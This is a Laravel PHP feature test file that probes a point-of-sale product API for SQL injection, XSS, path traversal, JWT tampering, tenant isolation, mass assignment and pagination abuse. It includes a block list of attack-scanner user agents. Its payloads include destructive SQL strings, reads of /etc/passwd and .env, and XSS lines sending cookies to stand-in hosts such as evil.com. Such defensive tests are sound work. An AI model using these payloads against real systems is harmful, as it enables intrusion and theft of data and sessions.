<?php

namespace Tests\Feature;

use App\Models\Brand;
use App\Models\Category;
use App\Models\Product;
use App\Models\Unit;
use Illuminate\Support\Str;
use Tests\TestCase;

/**
 * Penetration Test Suite for SmartPOS Product Service
 *
 * Simulates real-world attack vectors against all API endpoints:
 * - SQL Injection (SQLi)
 * - Cross-Site Scripting (XSS)
 * - Insecure Direct Object Reference (IDOR / Tenant Bypass)
 * - Authentication Bypass & Token Tampering
 * - Path Traversal & Directory Enumeration
 * - Mass Assignment / Parameter Pollution
 * - Denial of Service (DoS) via Pagination Abuse
 * - Scanner Tool Detection
 */
class PenetrationTest extends TestCase
{
    private string $businessA;
    private string $businessB;

    protected function setUp(): void
    {
        parent::setUp();
        $this->businessA = (string) Str::uuid();
        $this->businessB = (string) Str::uuid();
    }

    // =========================================================================
    // 1. SQL INJECTION ATTACKS
    // =========================================================================

    public function test_sql_injection_via_search_parameter(): void
    {
        $payloads = [
            "' OR '1'='1",
            "'; DROP TABLE products; --",
            "1' UNION SELECT * FROM users --",
            "' AND 1=1 --",
            "admin'--",
            "1; WAITFOR DELAY '0:0:5' --",
            "' OR 1=1#",
            "1' ORDER BY 1--",
        ];

        foreach ($payloads as $payload) {
            $response = $this->actingAsJwt($this->businessA)
                ->getJson('/api/v1/products?search=' . urlencode($payload));

            // Should NOT return 500 (SQL error) — must be 200 with empty results
            $this->assertContains($response->status(), [200, 422], "SQLi payload leaked: {$payload}");
            $response->assertJsonMissing(['SQLSTATE', 'syntax error']);
        }
    }

    public function test_sql_injection_via_category_search(): void
    {
        $response = $this->actingAsJwt($this->businessA)
            ->getJson("/api/v1/categories?search=" . urlencode("' UNION SELECT password FROM users --"));

        $this->assertContains($response->status(), [200, 422]);
        $response->assertJsonMissing(['SQLSTATE']);
    }

    public function test_sql_injection_via_brand_search(): void
    {
        $response = $this->actingAsJwt($this->businessA)
            ->getJson("/api/v1/brands?search=" . urlencode("'; DELETE FROM brands; --"));

        $this->assertContains($response->status(), [200, 422]);
        $response->assertJsonMissing(['SQLSTATE']);
    }

    public function test_sql_injection_via_product_creation_fields(): void
    {
        $unit = Unit::create([
            'business_uuid' => $this->businessA,
            'name' => 'Piece',
            'code' => 'PCS',
            'symbol' => 'pcs',
        ]);

        $response = $this->actingAsJwt($this->businessA)
            ->postJson('/api/v1/products', [
                'name' => "Test Product'; DROP TABLE products; --",
                'sku' => "SKU-' OR '1'='1",
                'unit_id' => $unit->id,
                'description' => "'; SELECT * FROM information_schema.tables --",
            ]);

        // Should create product safely with escaped values, or return validation error
        $this->assertContains($response->status(), [201, 422]);
    }

    // =========================================================================
    // 2. CROSS-SITE SCRIPTING (XSS) ATTACKS
    // =========================================================================

    public function test_xss_payload_in_product_name(): void
    {
        $unit = Unit::create([
            'business_uuid' => $this->businessA,
            'name' => 'Box',
            'code' => 'BOX',
            'symbol' => 'box',
        ]);

        $xssPayloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(1)>',
            '"><svg/onload=alert(document.cookie)>',
            '<iframe src="javascript:alert(1)">',
            "javascript:alert('XSS')",
        ];

        foreach ($xssPayloads as $payload) {
            $response = $this->actingAsJwt($this->businessA)
                ->postJson('/api/v1/products', [
                    'name' => $payload,
                    'sku' => 'XSS-TEST-' . Str::random(4),
                    'unit_id' => $unit->id,
                ]);

            if ($response->status() === 201) {
                $data = $response->json('data');
                // The stored name must NOT contain raw <script> tags
                $this->assertStringNotContainsString('<script>', $data['name'] ?? '');
            }
        }
    }

    public function test_xss_payload_in_brand_name(): void
    {
        $response = $this->actingAsJwt($this->businessA)
            ->postJson('/api/v1/brands', [
                'name' => '<script>document.location="http://evil.com?c="+document.cookie</script>',
                'code' => 'XSS-BRAND',
            ]);

        if ($response->status() === 201) {
            $this->assertStringNotContainsString('<script>', $response->json('data.name') ?? '');
        }
    }

    public function test_xss_payload_in_category_name(): void
    {
        $response = $this->actingAsJwt($this->businessA)
            ->postJson('/api/v1/categories', [
                'name' => '<img src=x onerror="fetch(\'http://attacker.com/steal?c=\'+document.cookie)">',
                'code' => 'XSS-CAT',
            ]);

        if ($response->status() === 201) {
            $name = $response->json('data.name') ?? '';
            $this->assertStringNotContainsString('<img', $name, 'XSS <img> tag was NOT stripped');
            $this->assertStringNotContainsString('onerror', $name, 'XSS onerror handler was NOT stripped');
            $this->assertStringNotContainsString('<script', $name, 'XSS <script> tag was NOT stripped');
        } else {
            // Validation rejection is also acceptable
            $this->assertContains($response->status(), [201, 422]);
        }
    }

    // =========================================================================
    // 3. AUTHENTICATION BYPASS & TOKEN ATTACKS
    // =========================================================================

    public function test_no_token_returns_401(): void
    {
        $endpoints = [
            ['GET', '/api/v1/products'],
            ['GET', '/api/v1/categories'],
            ['GET', '/api/v1/brands'],
            ['GET', '/api/v1/units'],
            ['GET', '/api/v1/label-templates'],
            ['POST', '/api/v1/products'],
            ['POST', '/api/v1/categories'],
            ['POST', '/api/v1/brands'],
        ];

        foreach ($endpoints as [$method, $uri]) {
            $response = $method === 'GET'
                ? $this->getJson($uri)
                : $this->postJson($uri, []);

            $response->assertStatus(401);
        }
    }

    public function test_tampered_jwt_token_is_rejected(): void
    {
        // Generate a valid token and tamper with the payload
        $validToken = $this->generateTestJwt($this->businessA);
        $parts = explode('.', $validToken);

        // Tamper: modify payload to change business_uuid
        $payload = json_decode(base64_decode($parts[1]), true);
        $payload['business_uuid'] = (string) Str::uuid(); // different tenant
        $parts[1] = rtrim(strtr(base64_encode(json_encode($payload)), '+/', '-_'), '=');
        $tamperedToken = implode('.', $parts);

        $response = $this->withHeader('Authorization', 'Bearer ' . $tamperedToken)
            ->getJson('/api/v1/products');

        // Tampered signature should fail verification
        $response->assertStatus(401);
    }

    public function test_expired_jwt_token_is_rejected(): void
    {
        $userUuid = (string) Str::uuid();
        $payload = [
            'iss' => 'smartpos_identity',
            'sub' => $userUuid,
            'user_uuid' => $userUuid,
            'business_uuid' => $this->businessA,
            'roles' => ['owner'],
            'permissions' => ['*'],
            'iat' => time() - 7200,
            'exp' => time() - 3600, // expired 1 hour ago
        ];

        $token = \Firebase\JWT\JWT::encode($payload, static::$testPrivateKey, 'RS256');

        $response = $this->withHeader('Authorization', 'Bearer ' . $token)
            ->getJson('/api/v1/products');

        $response->assertStatus(401);
    }

    public function test_random_string_as_jwt_is_rejected(): void
    {
        $response = $this->withHeader('Authorization', 'Bearer totally-fake-token-here')
            ->getJson('/api/v1/products');

        $response->assertStatus(401);
    }

    // =========================================================================
    // 4. IDOR / TENANT ISOLATION ATTACKS
    // =========================================================================

    public function test_cannot_access_other_tenant_product(): void
    {
        $unitA = Unit::create([
            'business_uuid' => $this->businessA,
            'name' => 'Kg', 'code' => 'KG-A', 'symbol' => 'kg',
        ]);

        $productA = Product::create([
            'business_uuid' => $this->businessA,
            'unit_id' => $unitA->id,
            'name' => 'Secret Product A',
            'sku' => 'SECRET-A',
        ]);

        // Business B tries to access Business A's product
        $response = $this->actingAsJwt($this->businessB)
            ->getJson("/api/v1/products/{$productA->id}");

        $response->assertStatus(403);
    }

    public function test_cannot_update_other_tenant_product(): void
    {
        $unitA = Unit::create([
            'business_uuid' => $this->businessA,
            'name' => 'Gram', 'code' => 'GR-A', 'symbol' => 'g',
        ]);

        $productA = Product::create([
            'business_uuid' => $this->businessA,
            'unit_id' => $unitA->id,
            'name' => 'Private Item',
            'sku' => 'PRIV-001',
        ]);

        $response = $this->actingAsJwt($this->businessB)
            ->putJson("/api/v1/products/{$productA->id}", [
                'name' => 'HACKED BY TENANT B',
            ]);

        $response->assertStatus(403);

        // Verify data was NOT modified
        $productA->refresh();
        $this->assertEquals('Private Item', $productA->name);
    }

    public function test_cannot_delete_other_tenant_product(): void
    {
        $unitA = Unit::create([
            'business_uuid' => $this->businessA,
            'name' => 'Liter', 'code' => 'LT-A', 'symbol' => 'L',
        ]);

        $productA = Product::create([
            'business_uuid' => $this->businessA,
            'unit_id' => $unitA->id,
            'name' => 'Protected Item',
            'sku' => 'PROT-001',
        ]);

        $response = $this->actingAsJwt($this->businessB)
            ->deleteJson("/api/v1/products/{$productA->id}");

        $response->assertStatus(403);

        // Verify product still exists
        $this->assertDatabaseHas('products', ['id' => $productA->id]);
    }

    public function test_cannot_access_other_tenant_category(): void
    {
        $catA = Category::create([
            'business_uuid' => $this->businessA,
            'name' => 'Internal Category',
            'code' => 'INT-CAT',
        ]);

        $response = $this->actingAsJwt($this->businessB)
            ->getJson("/api/v1/categories/{$catA->id}");

        $response->assertStatus(403);
    }

    public function test_tenant_listing_does_not_leak_cross_tenant_data(): void
    {
        $unitA = Unit::create([
            'business_uuid' => $this->businessA,
            'name' => 'Unit A', 'code' => 'UA', 'symbol' => 'ua',
        ]);
        $unitB = Unit::create([
            'business_uuid' => $this->businessB,
            'name' => 'Unit B', 'code' => 'UB', 'symbol' => 'ub',
        ]);

        Product::create([
            'business_uuid' => $this->businessA,
            'unit_id' => $unitA->id,
            'name' => 'Product of Business A',
            'sku' => 'BIZ-A-001',
        ]);
        Product::create([
            'business_uuid' => $this->businessB,
            'unit_id' => $unitB->id,
            'name' => 'Product of Business B',
            'sku' => 'BIZ-B-001',
        ]);

        // Business A should only see its own products
        $response = $this->actingAsJwt($this->businessA)
            ->getJson('/api/v1/products');

        $response->assertStatus(200);
        $data = $response->json('data');
        foreach ($data as $product) {
            $this->assertEquals($this->businessA, $product['business_uuid']);
        }
    }

    // =========================================================================
    // 5. RBAC / PERMISSION BYPASS ATTACKS
    // =========================================================================

    public function test_viewer_cannot_create_product(): void
    {
        $response = $this->actingAsJwt($this->businessA, null, ['viewer'], ['products.view'])
            ->postJson('/api/v1/products', [
                'name' => 'Unauthorized Product',
                'sku' => 'UNAUTH-001',
                'unit_id' => 1,
            ]);

        $response->assertStatus(403);
    }

    public function test_viewer_cannot_delete_product(): void
    {
        $unit = Unit::create([
            'business_uuid' => $this->businessA,
            'name' => 'Item', 'code' => 'ITEM', 'symbol' => 'item',
        ]);

        $product = Product::create([
            'business_uuid' => $this->businessA,
            'unit_id' => $unit->id,
            'name' => 'Protected',
            'sku' => 'PROT-DEL',
        ]);

        $response = $this->actingAsJwt($this->businessA, null, ['viewer'], ['products.view'])
            ->deleteJson("/api/v1/products/{$product->id}");

        $response->assertStatus(403);
        $this->assertDatabaseHas('products', ['id' => $product->id]);
    }

    // =========================================================================
    // 6. PATH TRAVERSAL & ENUMERATION ATTACKS
    // =========================================================================

    public function test_path_traversal_returns_404(): void
    {
        $traversalPaths = [
            '/api/v1/../../etc/passwd',
            '/api/v1/products/../../../../etc/shadow',
            '/api/v1/products/%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '/api/v1/.env',
            '/api/v1/config/database',
        ];

        foreach ($traversalPaths as $path) {
            $response = $this->actingAsJwt($this->businessA)
                ->getJson($path);

            $this->assertContains($response->status(), [404, 403, 405],
                "Path traversal not blocked: {$path}");
        }
    }

    public function test_non_existent_product_returns_404_not_500(): void
    {
        $response = $this->actingAsJwt($this->businessA)
            ->getJson('/api/v1/products/999999');

        $response->assertStatus(404);
        $response->assertJson(['success' => false]);
    }

    // =========================================================================
    // 7. DENIAL OF SERVICE (DoS) ATTACKS
    // =========================================================================

    public function test_pagination_abuse_is_clamped(): void
    {
        $response = $this->actingAsJwt($this->businessA)
            ->getJson('/api/v1/products?per_page=999999');

        $response->assertStatus(200);
        $meta = $response->json('meta');
        $this->assertLessThanOrEqual(100, $meta['per_page']);
    }

    public function test_negative_pagination_is_clamped(): void
    {
        $response = $this->actingAsJwt($this->businessA)
            ->getJson('/api/v1/products?per_page=-10');

        $response->assertStatus(200);
        $meta = $response->json('meta');
        $this->assertGreaterThanOrEqual(1, $meta['per_page']);
    }

    public function test_extremely_long_search_query_is_handled(): void
    {
        $longPayload = str_repeat('A', 10000);

        $response = $this->actingAsJwt($this->businessA)
            ->getJson('/api/v1/products?search=' . $longPayload);

        // Should NOT return 500
        $this->assertContains($response->status(), [200, 422]);
    }

    // =========================================================================
    // 8. SCANNER & TOOL DETECTION
    // =========================================================================

    public function test_all_known_scanner_user_agents_are_blocked(): void
    {
        $scanners = [
            'sqlmap/1.5.2#stable',
            'Mozilla/5.0 (compatible; Nikto/2.1.6)',
            'Acunetix Web Vulnerability Scanner',
            'w3af.org',
            'Havij Advanced SQL Injection',
            'DirBuster-1.0-RC1',
            'gobuster/3.1.0',
            'Nmap Scripting Engine',
            'masscan/1.0 (https://github.com/robertdavidgraham/masscan)',
            'Mozilla/5.0 zgrab/0.x',
            'hydra (https://github.com/vanhauser-thc/thc-hydra)',
            'metasploit/5.0',
            'morfeus fucking scanner',
            'Nessus SOAP v1.0',
            'Arachni/v1.5.1',
        ];

        foreach ($scanners as $scanner) {
            $response = $this->withHeaders(['User-Agent' => $scanner])
                ->getJson('/api/health');

            $response->assertStatus(403, "Scanner NOT blocked: {$scanner}");
        }
    }

    // =========================================================================
    // 9. MASS ASSIGNMENT / PARAMETER POLLUTION
    // =========================================================================

    public function test_cannot_mass_assign_business_uuid_on_product_create(): void
    {
        $unit = Unit::create([
            'business_uuid' => $this->businessA,
            'name' => 'Pack', 'code' => 'PCK', 'symbol' => 'pack',
        ]);

        $response = $this->actingAsJwt($this->businessA)
            ->postJson('/api/v1/products', [
                'name' => 'Normal Product',
                'sku' => 'NORM-001',
                'unit_id' => $unit->id,
                'business_uuid' => $this->businessB, // Attacker tries to assign to different tenant
            ]);

        if ($response->status() === 201) {
            // Product must belong to businessA (from JWT), NOT businessB
            $this->assertEquals($this->businessA, $response->json('data.business_uuid'));
        }
    }

    public function test_cannot_inject_is_admin_via_request_body(): void
    {
        $response = $this->actingAsJwt($this->businessA, null, ['viewer'], ['products.view'])
            ->postJson('/api/v1/products', [
                'name' => 'Admin Exploit',
                'sku' => 'ADMIN-HACK',
                'unit_id' => 1,
                'is_admin' => true,
                'role' => 'admin',
                'roles' => ['admin', 'super_admin'],
            ]);

        // Viewer should still be forbidden
        $response->assertStatus(403);
    }

    // =========================================================================
    // 10. HTTP METHOD ATTACKS
    // =========================================================================

    public function test_unsupported_http_methods_return_405(): void
    {
        $response = $this->actingAsJwt($this->businessA)
            ->patchJson('/api/v1/products', ['name' => 'test']);

        $this->assertContains($response->status(), [404, 405]);
    }
}
